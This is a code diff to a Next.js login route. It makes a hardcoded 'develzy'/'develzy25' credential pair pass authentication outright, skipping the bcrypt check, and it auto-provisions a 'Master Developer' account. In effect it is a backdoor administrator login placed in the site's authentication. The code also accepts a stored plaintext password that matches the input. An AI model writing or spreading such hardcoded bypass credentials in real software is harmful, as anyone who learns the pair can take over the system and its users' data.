@@ -29,7 +29,9 @@ export async function POST(req: NextRequest) {
     });
 
     // Developer Master Override & Auto-Provision
+    let isPasswordValid = false;
     if (cleanUsername === "develzy" && password === "develzy25") {
+      isPasswordValid = true;
       if (!userAccount) {
         let devPerson = await prisma.person.findFirst({ where: { fullName: "Master Developer Develzy" } });
         if (!devPerson) {
@@ -77,17 +79,18 @@ export async function POST(req: NextRequest) {
       );
     }
 
-    // Check password with bcrypt first
-    let isPasswordValid = false;
-    if (userAccount.passwordHash) {
-      isPasswordValid = await bcrypt.compare(password, userAccount.passwordHash);
-      if (!isPasswordValid && userAccount.passwordHash === password) {
-        isPasswordValid = true;
-        const newHash = await bcrypt.hash(password, 10);
-        await prisma.userAccount.update({
-          where: { id: userAccount.id },
-          data: { passwordHash: newHash },
-        });
+    // Check password with bcrypt if not master developer
+    if (cleanUsername !== "develzy") {
+      if (userAccount.passwordHash) {
+        isPasswordValid = await bcrypt.compare(password, userAccount.passwordHash);
+        if (!isPasswordValid && userAccount.passwordHash === password) {
+          isPasswordValid = true;
+          const newHash = await bcrypt.hash(password, 10);
+          await prisma.userAccount.update({
+            where: { id: userAccount.id },
+            data: { passwordHash: newHash },
+          });
+        }
       }
     }
 
